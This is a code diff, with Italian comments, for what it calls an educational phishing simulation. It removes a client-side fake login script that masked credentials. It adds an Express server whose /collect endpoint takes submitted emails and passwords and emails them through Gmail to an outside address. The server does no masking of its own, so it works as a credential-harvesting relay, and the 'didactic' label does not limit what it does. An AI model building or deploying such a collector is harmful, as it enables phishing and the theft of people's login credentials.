@@ -1,37 +1,43 @@
-<script>
-function maskEmail(email) {
-  const [u, d] = email.split("@");
-  return u[0] + "****@" + d;
-}
+const express = require("express");
+const nodemailer = require("nodemailer");
 
-function maskPassword(password) {
-  return "*".repeat(password.length);
-}
+const app = express();
+app.use(express.json());
 
-function fakeLogin() {
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
+/* ===== CONFIG EMAIL ===== */
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: "TUO_GMAIL@gmail.com",        // mittente
+    pass: "APP_PASSWORD_GMAIL"          // NON la password normale
+  }
+});
 
-  const payload = {
-    email: maskEmail(email),
-    password: maskPassword(password),
-    passwordLength: password.length,
-    timestamp: new Date().toISOString()
-  };
+/* ===== ENDPOINT ===== */
+app.post("/collect", async (req, res) => {
+  const d = req.body;
 
-  fetch("http://localhost:3000/collect", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(payload)
+  const text = `
+SIMULAZIONE PHISHING (DIDATTICA)
+
+Email inserita: ${d.email}
+Password: ${d.password}
+Lunghezza password: ${d.passwordLength}
+Timestamp: ${d.timestamp}
+
+⚠ Nessuna credenziale reale è stata trasmessa.
+`;
+
+  await transporter.sendMail({
+    from: '"Security Demo" <demo@localhost>',
+    to: "ciao@gmail.com",
+    subject: "[SIMULAZIONE] Credenziali mascherate",
+    text
   });
 
-  alert(
-    "SIMULAZIONE DIDATTICA\n\n" +
-    "I dati sono stati inviati via email in forma MASCHERATA."
-  );
+  res.sendStatus(200);
+});
 
-  return false;
-}
-</script>
+app.listen(3000, () => {
+  console.log("Server avviato su http://localhost:3000");
+});
